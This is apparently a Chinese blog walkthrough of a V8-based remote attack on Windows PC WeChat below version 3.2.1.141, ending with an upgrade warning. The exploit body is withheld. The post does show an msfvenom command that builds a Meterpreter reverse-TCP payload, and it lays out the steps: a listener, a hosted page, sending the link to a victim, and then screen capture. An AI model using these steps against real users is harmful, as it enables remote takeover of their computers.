# 仅供学习，干坏事一概不负责！！！

**根据腾讯安全中心的公告，这是因为chrome浏览器使用的V8引擎存在安全问题导致的。该漏洞仅影响windows版本的PC版微信，且只影响3.2.1.141以下版本。**  
![u=2869398199,1478601235&fm=11&gp=0.jpg](https://image.3001.net/images/20210422/1619097241_60817699d67a4816151ee.jpg!small)  
1、漏洞利用的html，通过html调用JavaScript

    
    
    <script src = "wa.js"></script>
    

2、wa.js 这里就不展示恶意部分了

    
    
    ENABLE_LOG = true;
    IN_WORKER = true;
    var shellcode = [ ]
    ·
    ·
    ·
    try{
        print("start running");
        trigger();
    }catch(e){
        print(e);
    }
    

3、使用Kali自带的msfvenom生成反弹木马，并将生成十六进制添加到上面代码的shellcode中

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.65 lport=9999 -f csharp
    

![1.PNG](https://image.3001.net/images/20210422/1619097147_6081763bb9ed74de50b4a.png!small)  
4、再使用metersploit监听端口，设置本地ip和本地监听端口  
![2.PNG](https://image.3001.net/images/20210422/1619097163_6081764baa8acbe5a6288.png!small)  
5、再使用python开发web服务器  
![3.PNG](https://image.3001.net/images/20210422/1619097182_6081765e5d0d8d85d883d.png!small)  
6、将恶意链接发送到微信，并用微信点击打开  
![4.PNG](https://image.3001.net/images/20210422/1619097198_6081766e5e0d6ac77e91b.png!small)  
7、此时受害者就已经中招了，可以使用screenshot命令获取受害者PC当前画面的截图，可以想做什么就做什么了  
![5.PNG](https://image.3001.net/images/20210422/1619097210_6081767aef8a8125bd117.png!small)

# PC端微信快升级到最新版本！！！

![u=1301411739,844423148&fm=26&gp=0.jpg](https://image.3001.net/images/20210422/1619097331_608176f37bf48d84af63b.jpg!small)

